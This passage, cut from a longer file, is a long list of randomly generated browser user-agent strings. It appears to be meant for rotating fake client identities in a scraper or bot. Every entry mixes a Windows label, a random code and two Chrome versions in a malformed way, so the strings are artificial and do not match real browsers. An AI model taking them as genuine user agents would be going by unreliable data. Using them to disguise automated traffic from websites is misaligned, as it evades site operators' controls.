Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y865A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4775.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K125O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4631.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A994D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4605.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J160C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4272.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J878R) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4200.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E688O) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4451.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q403T) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4322.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R297H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4512.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P633Z) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4581.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C405J) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4539.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P866Z) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4203.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P65E) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4223.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U289K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4419.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O37O) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4850.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H973Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4428.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M308G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4666.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D682K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4448.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A304S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4699.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y652C) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4421.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O349G) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4520.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L794C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4647.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X665H) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4780.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I201D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4536.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P394P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4324.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H278C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4769.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X774F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4388.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X80N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4464.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L281E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4466.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I612P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4526.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P201L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4320.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A593D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4811.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X563I) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4212.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A471A) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4529.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U228Y) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4364.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P996R) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4483.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A605G) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4631.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z637A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4653.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M539B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4852.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E400T) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4257.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O200H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4518.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z788X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4316.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I245P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4505.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F851C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4395.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A403D) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4505.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D725R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4686.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U479A) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4712.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y368Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4612.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P27V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4388.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A350W) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4508.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y830J) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4426.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q290L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4691.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K103L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4230.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K429J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4350.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R495Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4266.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K46A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4309.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G464O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4408.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A962N) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4408.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S381A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4206.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B215E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4822.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T938S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4356.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T656F) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4883.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H562X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4862.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V628G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4217.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I726Y) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4705.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O556O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4295.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J448P) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4436.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D776F) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4828.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T250O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4651.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I345Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4442.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y402R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4296.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C683R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4633.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z847M) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4288.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E472V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4710.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W828L) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4401.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B276A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4772.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C350E) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4224.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I643M) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4769.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q315A) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4672.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N821B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4603.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A703A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4252.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A136W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4796.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J8U) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4690.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B168Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4663.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)G200U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4657.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O391O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4241.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F210Y) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4707.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E921F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4606.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A574M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4575.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O228L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4782.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W317B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4412.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J471S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4402.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A574N) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4447.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T741T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4715.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V736T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4492.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M294F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4465.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L133D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4362.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K901C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4270.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A235X) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4453.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R373V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4541.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T275X) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4287.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O471P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4266.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H797O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4611.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J953R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4339.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)X622W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4856.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W709B) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4278.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X274B) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4891.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A272S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4778.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H312G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4203.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O306X) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4493.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I785V) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4321.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L918W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4586.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R428I) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4490.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N242N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4474.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F619T) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4235.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S290A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4756.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J280M) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4338.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H563P) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4249.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G858A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4820.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K668V) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4794.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V797T) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4719.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W493E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4429.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L293Y) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4285.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J766I) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4459.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N132W) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4476.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B128M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4562.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T808C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4458.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R685R) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4274.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P230G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4760.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A177D) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4470.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X660D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4308.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E315H) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4690.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M687D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4239.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y999N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4690.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J119X) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4566.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C673W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4494.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N338V) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4658.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L628B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4251.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S350J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4467.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A126M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4706.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A173Z) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4773.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N632U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4759.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)X395A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4745.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V707B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4569.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X997A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4404.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A348N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4408.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D614W) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4316.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M342R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4720.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F99U) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4477.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P416V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4859.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E875W) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4707.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B872W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4694.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M283S) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4477.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q619E) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4538.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q375A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4335.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y725A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4686.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U514A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4686.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R779W) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4477.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D911H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4825.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W437O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4322.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S669T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4627.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U57T) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4730.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P57Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4485.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; 